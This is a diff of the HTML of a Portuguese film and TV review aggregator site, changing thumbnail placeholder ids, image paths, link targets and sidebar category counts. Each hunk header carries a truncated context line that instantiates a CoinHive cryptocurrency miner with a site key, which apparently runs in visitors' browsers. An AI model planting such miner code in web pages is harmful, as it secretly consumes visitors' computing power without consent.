 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1059,18 +1106,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7413" title="Atômica (Atomic Blonde) &#8211; Comentários SEM spoilers">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed812a6" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8de05b" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed812a6' ).animateSvg();
+                $( '#59bd5de8de05b' ).animateSvg();
               });
-            } else { $( '#59bb7fed812a6' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8de05b' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Atômica (Atomic Blonde) &#8211; Comentários SEM spoilers" data-hu-post-id="59bb7fed812a6" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Atômica (Atomic Blonde) &#8211; Comentários SEM spoilers" data-hu-post-id="59bd5de8de05b" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -1086,7 +1133,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7413" rel="bookmark" title="Atômica (Atomic Blonde) &#8211; Comentários SEM spoilers" target="_blank">Atômica (Atomic Blonde) &#8211; Comentários SEM spoilers</a>
+			<a href="/archives/7413" rel="bookmark" title="Atômica (Atomic Blonde) &#8211; Comentários SEM spoilers">Atômica (Atomic Blonde) &#8211; Comentários SEM spoilers</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1099,18 +1146,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7406" title="ATÔMICA (Atomic Blonde, 2017) &#8211; Crítica">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed840fa" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8df89c" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed840fa' ).animateSvg();
+                $( '#59bd5de8df89c' ).animateSvg();
               });
-            } else { $( '#59bb7fed840fa' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8df89c' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="ATÔMICA (Atomic Blonde, 2017) &#8211; Crítica" data-hu-post-id="59bb7fed840fa" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="ATÔMICA (Atomic Blonde, 2017) &#8211; Crítica" data-hu-post-id="59bd5de8df89c" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -1126,7 +1173,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7406" rel="bookmark" title="ATÔMICA (Atomic Blonde, 2017) &#8211; Crítica" target="_blank">ATÔMICA (Atomic Blonde, 2017) &#8211; Crítica</a>
+			<a href="/archives/7406" rel="bookmark" title="ATÔMICA (Atomic Blonde, 2017) &#8211; Crítica">ATÔMICA (Atomic Blonde, 2017) &#8211; Crítica</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1139,18 +1186,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7379" title="Foi a PIOR temporada de GAME OF THRONES?😱 🔥 &#8211; OPINIÃO (SPOILER)">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed87b98" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8e1099" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed87b98' ).animateSvg();
+                $( '#59bd5de8e1099' ).animateSvg();
               });
-            } else { $( '#59bb7fed87b98' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8e1099' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Foi a PIOR temporada de GAME OF THRONES?😱 🔥 &#8211; OPINIÃO (SPOILER)" data-hu-post-id="59bb7fed87b98" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Foi a PIOR temporada de GAME OF THRONES?😱 🔥 &#8211; OPINIÃO (SPOILER)" data-hu-post-id="59bd5de8e1099" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -1166,7 +1213,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7379" rel="bookmark" title="Foi a PIOR temporada de GAME OF THRONES?😱 🔥 &#8211; OPINIÃO (SPOILER)" target="_blank">Foi a PIOR temporada de GAME OF THRONES?😱 🔥 &#8211; OPINIÃO (SPOILER)</a>
+			<a href="/archives/7379" rel="bookmark" title="Foi a PIOR temporada de GAME OF THRONES?😱 🔥 &#8211; OPINIÃO (SPOILER)">Foi a PIOR temporada de GAME OF THRONES?😱 🔥 &#8211; OPINIÃO (SPOILER)</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1179,18 +1226,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7372" title="DEATH NOTE &#8211; Crítica do filme da Netflix -🍿- Nerd Rabugento">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed8a0ad" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8e286a" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed8a0ad' ).animateSvg();
+                $( '#59bd5de8e286a' ).animateSvg();
               });
-            } else { $( '#59bb7fed8a0ad' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8e286a' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="DEATH NOTE &#8211; Crítica do filme da Netflix -🍿- Nerd Rabugento" data-hu-post-id="59bb7fed8a0ad" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="DEATH NOTE &#8211; Crítica do filme da Netflix -🍿- Nerd Rabugento" data-hu-post-id="59bd5de8e286a" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -1206,7 +1253,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7372" rel="bookmark" title="DEATH NOTE &#8211; Crítica do filme da Netflix -🍿- Nerd Rabugento" target="_blank">DEATH NOTE &#8211; Crítica do filme da Netflix -🍿- Nerd Rabugento</a>
+			<a href="/archives/7372" rel="bookmark" title="DEATH NOTE &#8211; Crítica do filme da Netflix -🍿- Nerd Rabugento">DEATH NOTE &#8211; Crítica do filme da Netflix -🍿- Nerd Rabugento</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1219,18 +1266,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7367" title="15 Momentos ADULTOS em STEVEN UNIVERSO! 😱 👶🏻">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed8d15d" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8e40ae" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed8d15d' ).animateSvg();
+                $( '#59bd5de8e40ae' ).animateSvg();
               });
-            } else { $( '#59bb7fed8d15d' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8e40ae' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="15 Momentos ADULTOS em STEVEN UNIVERSO! 😱 👶🏻" data-hu-post-id="59bb7fed8d15d" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="15 Momentos ADULTOS em STEVEN UNIVERSO! 😱 👶🏻" data-hu-post-id="59bd5de8e40ae" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -1246,7 +1293,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7367" rel="bookmark" title="15 Momentos ADULTOS em STEVEN UNIVERSO! 😱 👶🏻" target="_blank">15 Momentos ADULTOS em STEVEN UNIVERSO! 😱 👶🏻</a>
+			<a href="/archives/7367" rel="bookmark" title="15 Momentos ADULTOS em STEVEN UNIVERSO! 😱 👶🏻">15 Momentos ADULTOS em STEVEN UNIVERSO! 😱 👶🏻</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1259,18 +1306,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7361" title="A TORRE NEGRA 🍿 &#8211; Crítica do Filme de Terror &#8211; Nerd Rabugento">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed8ff75" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8e5bd3" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed8ff75' ).animateSvg();
+                $( '#59bd5de8e5bd3' ).animateSvg();
               });
-            } else { $( '#59bb7fed8ff75' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8e5bd3' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="A TORRE NEGRA 🍿 &#8211; Crítica do Filme de Terror &#8211; Nerd Rabugento" data-hu-post-id="59bb7fed8ff75" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="A TORRE NEGRA 🍿 &#8211; Crítica do Filme de Terror &#8211; Nerd Rabugento" data-hu-post-id="59bd5de8e5bd3" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -1286,7 +1333,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7361" rel="bookmark" title="A TORRE NEGRA 🍿 &#8211; Crítica do Filme de Terror &#8211; Nerd Rabugento" target="_blank">A TORRE NEGRA 🍿 &#8211; Crítica do Filme de Terror &#8211; Nerd Rabugento</a>
+			<a href="/archives/7361" rel="bookmark" title="A TORRE NEGRA 🍿 &#8211; Crítica do Filme de Terror &#8211; Nerd Rabugento">A TORRE NEGRA 🍿 &#8211; Crítica do Filme de Terror &#8211; Nerd Rabugento</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1299,18 +1346,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7341" title="8 Filmes BR que BOMBARAM na GRINGA! 🇧🇷  🇺🇸">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed92ae7" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8e7458" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed92ae7' ).animateSvg();
+                $( '#59bd5de8e7458' ).animateSvg();
               });
-            } else { $( '#59bb7fed92ae7' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8e7458' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="8 Filmes BR que BOMBARAM na GRINGA! 🇧🇷  🇺🇸" data-hu-post-id="59bb7fed92ae7" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="8 Filmes BR que BOMBARAM na GRINGA! 🇧🇷  🇺🇸" data-hu-post-id="59bd5de8e7458" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -1326,7 +1373,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7341" rel="bookmark" title="8 Filmes BR que BOMBARAM na GRINGA! 🇧🇷  🇺🇸" target="_blank">8 Filmes BR que BOMBARAM na GRINGA! 🇧🇷  🇺🇸</a>
+			<a href="/archives/7341" rel="bookmark" title="8 Filmes BR que BOMBARAM na GRINGA! 🇧🇷  🇺🇸">8 Filmes BR que BOMBARAM na GRINGA! 🇧🇷  🇺🇸</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1403,7 +1450,7 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-36"><a href="/archives/category/cine-alerta-series" >Cine Alerta (Séries)</a> (38)
 </li>
-	<li class="cat-item cat-item-2"><a href="/archives/category/cinema" >Cinema</a> (1,837)
+	<li class="cat-item cat-item-2"><a href="/archives/category/cinema" >Cinema</a> (1,841)
 </li>
 	<li class="cat-item cat-item-8"><a href="/archives/category/cinema-em-cena" >Cinema em Cena</a> (10)
 </li>
@@ -1413,13 +1460,13 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-32"><a href="/archives/category/cinema-em-serie-series" >Cinema em Série (Séries)</a> (3)
 </li>
-	<li class="cat-item cat-item-40"><a href="/archives/category/cinema-no-escurinho" >Cinema no escurinho</a> (10)
+	<li class="cat-item cat-item-40"><a href="/archives/category/cinema-no-escurinho" >Cinema no escurinho</a> (11)
 </li>
 	<li class="cat-item cat-item-38"><a href="/archives/category/criticos-com" >Críticos.com</a> (94)
 </li>
 	<li class="cat-item cat-item-11"><a href="/archives/category/estante-da-sala" >Estante da Sala</a> (40)
 </li>
-	<li class="cat-item cat-item-39"><a href="/archives/category/filmes-classicos" >Filmes Clássicos</a> (42)
+	<li class="cat-item cat-item-39"><a href="/archives/category/filmes-classicos" >Filmes Clássicos</a> (43)
 </li>
 	<li class="cat-item cat-item-10"><a href="/archives/category/filmes-do-chico" >Filmes do Chico</a> (24)
 </li>
@@ -1427,7 +1474,7 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-25"><a href="/archives/category/meus-2-centavos" >Meus 2 Centavos</a> (128)
 </li>
-	<li class="cat-item cat-item-18"><a href="/archives/category/mix-de-series" >Mix de Séries</a> (1,336)
+	<li class="cat-item cat-item-18"><a href="/archives/category/mix-de-series" >Mix de Séries</a> (1,339)
 </li>
 	<li class="cat-item cat-item-26"><a href="/archives/category/nerd-rabugento" >Nerd Rabugento</a> (96)
 </li>
@@ -1441,11 +1488,11 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-24"><a href="/archives/category/pipocando" >Pipocando</a> (192)
 </li>
-	<li class="cat-item cat-item-21"><a href="/archives/category/plano-critico-cinema" >Plano Crítico (Cinema)</a> (770)
+	<li class="cat-item cat-item-21"><a href="/archives/category/plano-critico-cinema" >Plano Crítico (Cinema)</a> (773)
 </li>
 	<li class="cat-item cat-item-20"><a href="/archives/category/plano-critico-series" >Plano Crítico (Séries)</a> (419)
 </li>
-	<li class="cat-item cat-item-6"><a href="/archives/category/podcast" >Podcast</a> (220)
+	<li class="cat-item cat-item-6"><a href="/archives/category/podcast" >Podcast</a> (221)
 </li>
 	<li class="cat-item cat-item-22"><a href="/archives/category/pop-series" >Pop Séries</a> (34)
 </li>
@@ -1453,11 +1500,11 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-13"><a href="/archives/category/razao-de-aspecto" >Razão de Aspecto</a> (177)
 </li>
-	<li class="cat-item cat-item-17"><a href="/archives/category/serie-maniacos" >Série Maníacos</a> (1,948)
+	<li class="cat-item cat-item-17"><a href="/archives/category/serie-maniacos" >Série Maníacos</a> (1,956)
 </li>
 	<li class="cat-item cat-item-34"><a href="/archives/category/serie-maniacos-podcast" >Série Maníacos (Podcast)</a> (69)
 </li>
-	<li class="cat-item cat-item-16"><a href="/archives/category/series" >Séries</a> (3,864)
+	<li class="cat-item cat-item-16"><a href="/archives/category/series" >Séries</a> (3,875)
 </li>
